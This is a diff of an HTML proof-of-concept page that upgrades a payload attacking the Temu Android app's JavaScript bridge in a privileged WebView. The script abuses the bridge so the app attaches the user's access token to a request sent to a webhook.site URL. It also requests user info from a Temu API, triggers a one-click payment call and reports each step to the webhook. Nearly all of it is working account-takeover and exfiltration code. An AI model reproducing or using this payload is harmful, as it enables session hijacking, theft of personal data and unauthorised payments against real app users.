@@ -1,28 +1,71 @@
 <!DOCTYPE html>
 <html>
-<head><title>Temu JS Bridge PoC</title></head>
+<head>
+    <title>Temu JS Bridge - Full Data Exfil</title>
+</head>
 <body>
-  <H1> IMPORTANT PAGE HA HA HA </H1>
+    <h1>🚀 Temu JS Bridge Payload v3 - Full Exfil</h1>
+    
 <script>
-  console.log("=== Temu JS Bridge Payload v2 Loaded ===");
-  const bridge = window.__tm_android_bridge;
+    console.log("=== Temu JS Bridge Full Exfil Payload Loaded ===");
 
-  if (!bridge) {
-    console.log("❌ Bridge not found!");
-  } else {
-    console.log("✅ Bridge found!");
+    const webhook = "https://webhook.site/#!/view/242315a0-d215-442c-b84b-dd31669e5904";
 
-    // تست Session Hijack
-    bridge.callNative("TMNetwork", "request", JSON.stringify({
-      url: "https://webhook.site/#!/view/242315a0-d215-442c-b84b-dd31669e5904",
-      method: "POST",
-      isApiRequest: true,
-      data: JSON.stringify({ stage: "jsbridge_ato" }),
-      encode_resp: false
-    }), Date.now());
+    function sendToWebhook(data, tag) {
+        fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                tag: tag,
+                timestamp: new Date().toISOString(),
+                data: data,
+                url: window.location.href,
+                bridge: !!window.__tm_android_bridge
+            })
+        })
+        .then(() => console.log(`✅ [${tag}] Data sent to webhook`))
+        .catch(err => console.error(`❌ [${tag}] Webhook failed:`, err));
+    }
 
-    console.log("Session Hijack request sent.");
-  }
+    const bridge = window.__tm_android_bridge;
+
+    if (!bridge) {
+        console.error("❌ Bridge not found! Page is not in privileged WebView.");
+        sendToWebhook({ error: "bridge_not_found" }, "BRIDGE_MISSING");
+    } else {
+        console.log("✅ Bridge found! Starting full data exfiltration...");
+
+        // ۱. Session Hijack + AccessToken Exfil (مهم‌ترین)
+        bridge.callNative("TMNetwork", "request", JSON.stringify({
+            url: webhook,
+            method: "POST",
+            isApiRequest: true,           // ← باعث تزریق خودکار AccessToken + ETag می‌شه
+            data: JSON.stringify({
+                stage: "full_session_hijack",
+                note: "AccessToken auto-injected by Temu"
+            }),
+            encode_resp: false
+        }), Date.now());
+
+        // ۲. خواندن اطلاعات کاربر (اگر ممکن باشه)
+        bridge.callNative("TMNetwork", "request", JSON.stringify({
+            url: "https://api.temu.com/api/bg/gateway?type=user_info",
+            method: "GET",
+            isApiRequest: false,
+            encode_resp: false
+        }), Date.now());
+
+        // ۳. تست Payment (برای تأیید)
+        bridge.callNative("TMPay", "startOneClickPay", JSON.stringify({
+            request_params: {
+                scene: "inner_foot_print_addition",
+                pre_parent_order_sn: "TEST_ORDER_001"
+            }
+        }), Date.now());
+
+        console.log("🚀 All critical calls sent to webhook.");
+        sendToWebhook({ status: "bridge_active", calls_sent: 3 }, "ATTACK_STARTED");
+    }
 </script>
 </body>
 </html>
